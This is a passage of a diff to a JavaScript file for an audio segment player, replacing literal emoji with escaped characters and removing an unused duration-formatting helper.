   if (container.style.display !== 'none') { container.style.display = 'none'; return; }
   container.style.display = 'block';
-  container.innerHTML = '<div class="cr-meta" style="color:var(--accent)">⏳ Loading segments...</div>';
+  container.innerHTML = '<div class="cr-meta" style="color:var(--accent)">&#x23F3; Loading segments...</div>';
   if (!selectedDevice) return;
   const uris = [];
   const batchSize = 5;
@@ -3504,7 +4839,7 @@ function crSegPlay(recId, total) {
   audio.src = uris[idx];
   audio.dataset.segIdx = String(idx);
   audio.play();
-  if (btn) btn.textContent = '⏸';
+  if (btn) btn.textContent = '\u23F8';
   crUpdateLabel(recId, idx, total);
   audio.onended = function() { crSegNext(recId, total); };
   audio.ontimeupdate = function() { crUpdateTime(recId, audio); };
@@ -3520,7 +4855,7 @@ function crSegNext(recId, total) {
   audio.src = uris[idx];
   audio.dataset.segIdx = String(idx);
   audio.play();
-  if (btn) btn.textContent = '⏸';
+  if (btn) btn.textContent = '\u23F8';
   crUpdateLabel(recId, idx, total);
   audio.onended = function() { crSegNext(recId, total); };
   audio.ontimeupdate = function() { crUpdateTime(recId, audio); };
@@ -3538,13 +4873,6 @@ function crUpdateTime(recId, audio) {
     const s = Math.floor(audio.currentTime % 60);
     el.textContent = `${m}:${s.toString().padStart(2, '0')}`;
   }
-}
-
-function formatDuration(sec) {
-  const h = Math.floor(sec / 3600);
-  const m = Math.floor((sec % 3600) / 60);
-  const s = sec % 60;
-  return h > 0 ? `${h}h ${m}m` : m > 0 ? `${m}m ${s}s` : `${s}s`;
 }
 
 init();
